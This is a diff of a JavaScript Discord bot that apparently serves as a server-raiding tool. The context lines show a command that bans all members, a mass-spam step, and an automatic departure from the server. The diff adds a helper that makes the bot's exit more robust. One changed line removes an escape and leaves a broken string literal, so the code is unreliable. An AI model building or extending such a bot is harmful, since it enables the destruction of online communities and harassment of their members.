@@ -50,6 +50,25 @@ async function handleRateLimit(promiseFn, maxRetries = 5) {
   return null;
 }
 
+// ====== SAFE LEAVE FUNCTION ======
+async function safeLeaveGuild(guild) {
+  try {
+    if (!guild || !guild.available || !guild.members.me) {
+      console.log('ℹ️ Cannot leave: Already left or guild unavailable');
+      return;
+    }
+
+    await handleRateLimit(() => guild.leave());
+    console.log('🚪 Successfully left the server.');
+  } catch (err) {
+    if ([50001, 404, 403].includes(err.code)) {
+      console.log('✅ Already left or kicked from server.');
+    } else {
+      throw err; // Re-throw unexpected errors
+    }
+  }
+}
+
 client.on('ready', () => {
   console.log(`🚀 Logged in as ${client.user.tag}`);
 });
@@ -86,7 +105,7 @@ client.on('messageCreate', async (message) => {
   // ===== BAN ALL MEMBERS =====
   if (command === 'ba') {
     if (!message.member.permissions.has('BanMembers')) {
-      return message.reply('❌ You don\'t have permission to ban members.');
+      return message.reply('❌ You don't have permission to ban members.');
     }
 
     const guild = message.guild;
@@ -262,13 +281,8 @@ client.on('messageCreate', async (message) => {
       console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);
       didSomething = true;
 
-      // Step 7: Leave server
-      try {
-        await handleRateLimit(() => guild.leave());
-        console.log('🚪 Left server.');
-      } catch (err) {
-        console.warn('⚠️ Failed to leave server:', err.message);
-      }
+      // Step 7: Leave server safely
+      await safeLeaveGuild(guild);
 
       if (!didSomething) {
         console.error('🚫 Could not perform any actions on this server.');
